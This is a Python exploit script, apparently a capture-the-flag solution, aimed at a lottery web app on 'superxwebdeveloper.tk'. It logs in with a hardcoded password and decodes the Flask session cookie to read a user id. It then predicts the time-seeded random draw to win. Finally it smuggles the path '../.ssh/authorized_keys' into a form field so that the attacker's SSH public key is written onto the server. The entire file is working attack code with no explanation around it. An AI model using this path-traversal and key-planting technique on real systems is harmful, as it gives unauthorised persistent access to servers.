import requests
from requests.auth import HTTPBasicAuth
from requests.utils import dict_from_cookiejar
import time
from flask_unsign.session import decode
import random
import sys


url_login = "https://superxwebdeveloper.tk/login"
url_winner = "https://superxwebdeveloper.tk/winner"
url_scoreboard = "https://superxwebdeveloper.tk/scoreboard"
username = "superXWebDeveloper"
password = "bA8wd5NkGvtMdaYgBbD3"


##Function we'll calculate
def good_numbers(id):
    random.seed(int(time.time()) + id)
    solution = random.sample(list(range(1,50)), 5)
    solution.sort()
    return ','.join([str(nb) for nb in solution])



def login(username, password):
    global url_login
    s = requests.Session()
    s.get(url_login) #Connect to url

    login = {'username' : username, "password" : password}
    result = s.post(url_login, data = login, allow_redirects = True )

    return s






if __name__ == "__main__":
    #Creation session to log on the website
    session = login(username, password)

    #Get the user id in the cookie and guess the right numbers
    cookies = decode( dict_from_cookiejar(session.cookies)["session"] )
    id = cookies['id']
    payload = {"guess" : good_numbers(id)}
    result_winner = session.post(url_winner, data = payload, allow_redirects = True )

    print(result_winner.text)

    #Give our public key and copy it
    payload = {}
    payload["name"] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOMQml5poR2ao1S0P3/n3LZOvhnXLwq2I95rmnHw4sGgPaP77xdT1LAya3g0CmPdRi6Afsz/P45hHwV8XP+/+y4FBsVxZM/iaeZ+UwpurX3p+jGsrBcYUZLGdd+PI+NbWr9kfAfQdbPXZ8mqOW0NpnIZ7Xdih3ypJFm2pyxChDaoAnfhG0G7nDTTLrwljAvb7MB76vZEeQj07usEqZTN3DcvTnPW7A6TnhMu1zLtB32NsE2J62P8/7x3ZYTwnMRdZLyLE1VmPRxSIDzzuO90LgVD7znMie8o7HEGFA8u0e5ZRnxcWYg5zVKQuZ37YXe861ot4LQS00MKcVzNYvGPl9Qkq3CbpDrIgWyW08hnxIOliUZ4uG2QKOU9W3k3tCrhrt05637H5KRCPJk9BvoTSQ2iTGNmIWt84AyPUa0Dwf5uH4ld8zww+cydp5kOrj3cXf7CmIZM5a0T3Qb4qAj99rKWatVexcEFL7/3yALW7/zMifrUKvg2X6EqYmF/iBqFSY4GtK+3mKAOeLsl7QNI8iuDdkTfNlKeAmRuQeUfD6BAFaCLxoqu8VC6bb5gpUNuHsSbdO6HJpVgVDheMvzmG9V/i+/pD7y4ZShbiyELRLwkVJ405GX/J41d2icrN2gi3YoDPZ9kwBK5tOaLxEnbNlu+GWDLxxOvz6MCbeZXaIVQ== quentin@quentin-VirtualBox"

    payload["date"] = "../.ssh/authorized_keys"
    print(payload)
    result_hof = session.post(url_scoreboard, data = payload, allow_redirects = True )
    print(result_hof.text)
